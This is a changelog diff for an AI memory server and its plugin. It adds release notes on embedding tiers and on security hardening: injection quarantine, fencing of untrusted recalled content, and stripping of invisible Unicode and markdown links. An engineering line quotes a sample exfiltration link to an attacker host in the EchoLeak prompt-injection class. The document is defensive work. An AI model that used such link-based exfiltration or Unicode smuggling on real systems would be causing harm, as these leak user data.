@@ -162,6 +162,36 @@ store — every neural path is opt-in via feature flags + profile env. See
 `IMPLEMENTATION_PLAN_v1.28_Caliber.md` +
 `IMPLEMENTATION_ROADMAP_v1.28_to_v2.0_ACUITY_EVIDENCE_GATED.md`.
 
+### Release notes
+
+**Bug fixes**
+
+- First-query timeouts after enabling the rerank tier — the model is now
+  loaded and warmed at startup instead of lazily inside the first recall.
+
+**Improvements**
+
+- Embedding models are now swappable behind a single interface, with
+  **opt-in quality tiers** (all off by default; the default build is
+  byte-identical in behavior):
+  - `enterprise` tier — BGE-M3 embeddings (1024-d).
+  - `desktop` tier — gte-base-en-v1.5 (768-d).
+  - an optional local cross-encoder rerank tier (bge-reranker-v2-m3) that
+    reorders recall results after fusion.
+- The vector store stamps its dimension and **refuses a mismatched
+  dimension switch** instead of silently comparing vectors of different
+  sizes.
+- `brain-server --re-embed <tier>` re-embeds the whole store when moving
+  between tiers (offline escape hatch).
+- The desktop memory ceiling rises to 1024 MiB to fit the optional neural
+  tiers (edge/Jetson stays 512).
+
+**Security fixes**
+
+- None in this release.
+
+### Engineering record
+
 - **M2 — the `Embedder` abstraction** (`src/embed.rs`, new lib module). The
   embedding model moves behind an object-safe trait
   (`encode`/`encode_one`/`store_dim`/`model_id`); `AppState.model` becomes
@@ -245,6 +275,29 @@ consolidation release of the ATLAS audit line — three bounds closed, one theme
 No new endpoints, no new fields, no telemetry. See
 `IMPLEMENTATION_PLAN_v1.20.29_Bound.md`. **ATLAS F-5 / F-6 / F-7.**
 
+### Release notes
+
+**Bug fixes**
+
+- None in this release.
+
+**Improvements**
+
+- The openclaw plugin collapses same-query recalls within a turn into a
+  single server call (previously one turn could fan out several), and caps
+  recalls per session turn.
+- Tool parameters are schema-checked instead of cast, per-hit content is
+  clamped to a sane length, and the context-token ceiling is enforced
+  consistently — smaller prompts, no runaway context growth.
+
+**Security fixes**
+
+- The server **refuses to start** when bound to a non-loopback interface
+  with no auth configured — previously that combination silently exposed
+  an unauthenticated, fully-privileged API.
+
+### Engineering record
+
 - **Bind fail-closed** (`src/main.rs`). `handlers/mod.rs:385` treats a `None`
   principal as superuser (the loopback back-compat posture); the symmetric gap
   was that a non-loopback bind with no `AUTH_TOKEN`/JWT configured would expose
@@ -280,6 +333,34 @@ No new endpoints, no new fields, no telemetry. See
 Server `Cargo.toml`/lock 1.20.27 → 1.20.28; plugin 0.4.0 → 0.4.1. Two coupled
 information-flow changes, one theme. No new endpoints, no new fields. See
 `IMPLEMENTATION_PLAN_v1.20.28_Fencepost.md`. **ATLAS F-3 / F-4.**
+
+### Release notes
+
+**Bug fixes**
+
+- **A quarantined proposal lost its warning flag on approval** — the
+  promotion insert never carried the flag, so content the injection screen
+  had quarantined became an ordinary retrievable memory with no trace of
+  the verdict. Approval now re-screens and preserves the flag as
+  provenance (the human's decision stays final; the flag is a record, not
+  a recall block).
+
+**Improvements**
+
+- The audit log now records the screen verdict on every approval
+  (clean/quarantine/reject), so post-hoc review can see what the
+  deterministic screen would have said.
+
+**Security fixes**
+
+- The plugin's `untrusted` marker is now **enforced, behind an unforgeable
+  fence**: untrusted recall content is wrapped in begin/end sentinels that
+  recalled chunks cannot forge (literal sentinels are stripped from hit
+  bodies), and only explicitly-untrusted hits are injected into the prompt.
+- Unicode tag-block characters (U+E0000–U+E007F) and markdown references
+  are additionally stripped from plugin-bound text.
+
+### Engineering record
 
 - **Server: quarantine taint survives HITL promotion as provenance**
   (`src/handlers/gate.rs`). The `approve_proposal` INSERT (L624) omitted the
@@ -321,6 +402,27 @@ Server `Cargo.toml`/lock 1.20.26 → 1.20.27; plugin unchanged. One pure functio
 one composition point. No new endpoints, no new fields. See
 `IMPLEMENTATION_PLAN_v1.20.27_Cordon.md`. **ATLAS F-2 (High).**
 
+### Release notes
+
+**Bug fixes**
+
+- None in this release.
+
+**Improvements**
+
+- None in this release.
+
+**Security fixes**
+
+- **Markdown-link exfiltration neutralized at the read seam** (the
+  EchoLeak / CVE-2025-32711 class): `![alt](url)` and `[text](url)` inside
+  stored content are rewritten to plain text before reaching MCP/HTTP
+  clients and the LLM consumers downstream — an image-pixel or tracking
+  URL embedded in a memory can no longer ride out as a live link. Bare
+  URLs in prose are intentionally left intact.
+
+### Engineering record
+
 - **`gate::strip_markdown_refs`** neutralizes the EchoLeak / CVE-2025-32711
 class at the source. `sanitize_read` previously stripped invisible Unicode only;
   `![alt](http://attacker/pixel?ctx=...)` and `[t](https://evil)` rode verbatim
@@ -349,6 +451,39 @@ class at the source. `sanitize_read` previously stripped invisible Unicode only;
 Server `Cargo.toml`/lock 1.20.25 → 1.20.26; plugin unchanged. One shared client
   builder, two call-site swaps. No new endpoints, no new fields, no new deps. See
 `IMPLEMENTATION_PLAN_v1.20.26_Tourniquet.md`. **ATLAS F-1 (High).**
+
+### Release notes
+
+Covers this release (Tourniquet) and the folded "Consolidate" changes that
+ship in the same binaries.
+
+**Bug fixes**
+
+- **Chunk purge and GDPR erasure left knowledge-graph relationships and
+  PII-named entity nodes behind** — a broken DELETE referenced a column that
+  doesn't exist and silently aborted, so every purge leaked graph residue.
+  Purges now sweep orphaned entities (shared ones survive) and erase
+  review-queue proposals for the subject.
+- Read-path redaction/strip now covers **every emitted text field** (title,
+  snippet, evidence text + headings on recall, search, and chunk fetches),
+  closing the gap where some fields rode raw past the PII mask.
+
+**Improvements**
+
+- None beyond the fixes above.
+
+**Security fixes**
+
+- The outbound webhook client **no longer follows redirects** — a
+  misconfigured webhook URL that 302s to a cloud-metadata or localhost
+  address is no longer fetched (SSRF egress path closed).
+- Audit and recall-trace hashes upgraded to **SHA-256** — low-entropy
+  inputs (a name, an SSN, a short query) can no longer be recovered by
+  brute-forcing the stored digest.
+- The webhook signing-secret file now **fails closed** on group/world-
+  readable permissions, matching the auth-token posture.
+
+### Engineering record
 
 - **`webhook::egress_client`** is the one outbound HTTP client now used by both
   webhook sinks (`alert.rs::sink` and `handlers/observe.rs::notify_art19`). Both
@@ -452,6 +587,40 @@ seven unpaid gaps. This release closes all seven — **no new features, no new
 endpoints**, only the missing enforcement, plus one genuine bug found by the
 new regression tests. See `IMPLEMENTATION_PLAN_v1.20.24_Sweep.md`.
 
+### Release notes
+
+**Bug fixes**
+
+- **`/decayed` has returned an empty list since v1.14** regardless of actual
+  expiry — a SQL type mismatch silently dropped every row. It now returns
+  the decayed chunks it always should have.
+
+**Improvements**
+
+- The decay-review endpoint scans a narrow index instead of the full table.
+- The client bounds long raw-text blocks (source prompts, evidence) in a
+  scroll box instead of wallpapering the approval view.
+
+**Security fixes**
+
+- Invisible-Unicode smuggling (bidi overrides, zero-width characters) is
+  now stripped at every agent-facing output seam: MCP tool results, the CLI,
+  the openclaw plugin, and the web client.
+- PII masking now applies uniformly on **all** read paths (single-chunk
+  fetch, multi-get, search, and the review queue), not only on recall —
+  for non-admin principals.
+- The server **refuses to start** when the auth-token file or JWT key is
+  group/world-readable (a leaked-secret file can no longer silently
+  authorize the API).
+- GDPR subject erasure now covers **every domain database** (multi-domain
+  deployments), not just the default one, and the deletion ledger carries
+  an aggregate SHA-256 digest.
+- Deletion digests are now SHA-256 instead of a fast 64-bit fingerprint,
+  so they can no longer be brute-forced offline for low-entropy content
+  (names, SSNs, short notes).
+
+### Engineering record
+
 - **G1 — every agent-facing seam strips invisible Unicode** (the v1.20.3
   `strip_invisible` class: C0/C1 controls, zero-width marks, bidi overrides/
   isolates). Now a shared lib module `src/strip_invisible.rs` (screen.rs
@@ -537,6 +706,30 @@ decision-latency. This release exposes it, adds a `since` window param, and
 computes the four reviewer signals client-side — **no new telemetry, no new
 server logic**, pure arithmetic over existing rows. See
 `IMPLEMENTATION_PLAN_v1.20.23_Calibrate.md`.
+
+### Release notes
+
+**Bug fixes**
+
+- None in this release.
+
+**Improvements**
+
+- The review queue now reports **when each proposal was decided** — the
+  decision timestamp was recorded all along but never surfaced to clients.
+- `GET /proposals` accepts a `?since=` window parameter (e.g. last-30-days
+  views) without changing the default response.
+- The client's Review panel shows a dismissable **reviewer calibration
+  strip**: approval rate, median decision latency, edit rate, and
+  screen-override rate, with a rubber-stamp warning when approvals exceed
+  90% over 20+ decisions. Pure arithmetic over existing rows — no new
+  telemetry.
+
+**Security fixes**
+
+- None in this release.
+
+### Engineering record
 
 - **M1.1 — `ProposalView.decided_at`** (`src/handlers/gate.rs`). The
   `list_proposals` SELECT now carries `decided_at` (column 11, `Option<i64>`);
